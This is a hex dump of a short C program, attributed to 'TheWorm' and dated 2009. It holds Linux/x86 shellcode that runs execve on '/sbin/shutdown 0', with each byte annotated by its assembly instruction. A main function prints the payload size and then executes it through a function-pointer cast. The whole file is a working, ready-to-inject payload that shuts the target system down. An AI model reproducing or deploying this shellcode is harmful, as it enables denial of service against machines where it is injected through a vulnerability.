00000000  23 69 6e 63 6c 75 64 65  20 3c 73 74 64 69 6f 2e  |#include <stdio.|
00000010  68 3e 0d 0a 0d 0a 63 6f  6e 73 74 20 63 68 61 72  |h>....const char|
00000020  20 73 68 65 6c 6c 63 6f  64 65 5b 5d 3d 0d 0a 09  | shellcode[]=...|
00000030  22 5c 78 36 61 5c 78 30  62 22 09 09 2f 2f 20 70  |"\x6a\x0b"..// p|
00000040  75 73 68 09 24 30 78 62  0d 0a 09 22 5c 78 35 38  |ush.$0xb..."\x58|
00000050  22 09 09 09 2f 2f 20 70  6f 70 09 25 65 61 78 0d  |"...// pop.%eax.|
00000060  0a 09 22 5c 78 39 39 22  09 09 09 2f 2f 20 63 6c  |.."\x99"...// cl|
00000070  74 64 0d 0a 09 22 5c 78  35 32 22 09 09 09 2f 2f  |td..."\x52"...//|
00000080  20 70 75 73 68 09 25 65  64 78 0d 0a 09 22 5c 78  | push.%edx..."\x|
00000090  36 38 5c 78 36 34 5c 78  36 66 5c 78 37 37 5c 78  |68\x64\x6f\x77\x|
000000a0  36 65 22 09 2f 2f 20 70  75 73 68 09 24 30 78 36  |6e".// push.$0x6|
000000b0  65 37 37 36 66 36 34 0d  0a 09 22 5c 78 36 38 5c  |e776f64..."\x68\|
000000c0  78 37 33 5c 78 36 38 5c  78 37 35 5c 78 37 34 22  |x73\x68\x75\x74"|
000000d0  09 2f 2f 20 70 75 73 68  09 24 30 78 37 34 37 35  |.// push.$0x7475|
000000e0  36 38 37 33 0d 0a 09 22  5c 78 36 38 5c 78 36 39  |6873..."\x68\x69|
000000f0  5c 78 36 65 5c 78 32 66  5c 78 32 66 22 09 2f 2f  |\x6e\x2f\x2f".//|
00000100  20 70 75 73 68 09 24 30  78 32 66 32 66 36 65 36  | push.$0x2f2f6e6|
00000110  39 0d 0a 09 22 5c 78 36  38 5c 78 32 66 5c 78 32  |9..."\x68\x2f\x2|
00000120  66 5c 78 37 33 5c 78 36  32 22 09 2f 2f 20 70 75  |f\x73\x62".// pu|
00000130  73 68 09 24 30 78 36 32  37 33 32 66 32 66 0d 0a  |sh.$0x62732f2f..|
00000140  09 22 5c 78 38 39 5c 78  65 33 22 09 09 2f 2f 20  |."\x89\xe3"..// |
00000150  6d 6f 76 09 25 65 73 70  2c 25 65 62 78 0d 0a 09  |mov.%esp,%ebx...|
00000160  22 5c 78 35 32 22 09 09  09 2f 2f 20 70 75 73 68  |"\x52"...// push|
00000170  09 25 65 64 78 0d 0a 09  22 5c 78 36 61 5c 78 33  |.%edx..."\x6a\x3|
00000180  30 22 09 09 2f 2f 20 70  75 73 68 09 24 30 78 33  |0"..// push.$0x3|
00000190  30 0d 0a 09 22 5c 78 35  32 22 09 09 09 2f 2f 20  |0..."\x52"...// |
000001a0  70 75 73 68 09 25 65 64  78 0d 0a 09 22 5c 78 35  |push.%edx..."\x5|
000001b0  33 22 09 09 09 2f 2f 20  70 75 73 68 09 25 65 62  |3"...// push.%eb|
000001c0  78 0d 0a 09 22 5c 78 38  39 5c 78 65 31 22 09 09  |x..."\x89\xe1"..|
000001d0  2f 2f 20 6d 6f 76 09 25  65 73 70 2c 25 65 63 78  |// mov.%esp,%ecx|
000001e0  0d 0a 09 22 5c 78 63 64  5c 78 38 30 22 3b 09 09  |..."\xcd\x80";..|
000001f0  2f 2f 20 69 6e 74 09 24  30 78 38 30 0d 0a 0d 0a  |// int.$0x80....|
00000200  69 6e 74 20 6d 61 69 6e  28 29 0d 0a 7b 0d 0a 09  |int main()..{...|
00000210  70 72 69 6e 74 66 09 28  22 5c 6e 5b 2b 5d 20 4c  |printf.("\n[+] L|
00000220  69 6e 75 78 2f 78 38 36  20 65 78 65 63 76 65 28  |inux/x86 execve(|
00000230  2f 73 62 69 6e 2f 73 68  75 74 64 6f 77 6e 2c 2f  |/sbin/shutdown,/|
00000240  73 62 69 6e 2f 73 68 75  74 64 6f 77 6e 20 30 29  |sbin/shutdown 0)|
00000250  22 0d 0a 09 09 22 5c 6e  5b 2b 5d 20 44 61 74 65  |"...."\n[+] Date|
00000260  3a 20 31 31 2f 30 37 2f  32 30 30 39 22 0d 0a 09  |: 11/07/2009"...|
00000270  09 22 5c 6e 5b 2b 5d 20  41 75 74 68 6f 72 3a 20  |."\n[+] Author: |
00000280  54 68 65 57 6f 72 6d 22  0d 0a 09 09 22 5c 6e 5c  |TheWorm"...."\n\|
00000290  6e 5b 2b 5d 20 53 68 65  6c 6c 63 6f 64 65 20 53  |n[+] Shellcode S|
000002a0  69 7a 65 3a 20 25 64 20  62 79 74 65 73 5c 6e 5c  |ize: %d bytes\n\|
000002b0  6e 22 2c 20 73 69 7a 65  6f 66 28 73 68 65 6c 6c  |n", sizeof(shell|
000002c0  63 6f 64 65 29 2d 31 29  3b 0d 0a 09 28 2a 28 76  |code)-1);...(*(v|
000002d0  6f 69 64 20 28 2a 29 28  29 29 20 73 68 65 6c 6c  |oid (*)()) shell|
000002e0  63 6f 64 65 29 28 29 3b  0d 0a 09 72 65 74 75 72  |code)();...retur|
000002f0  6e 20 30 3b 0d 0a 7d                              |n 0;..}|
000002f7
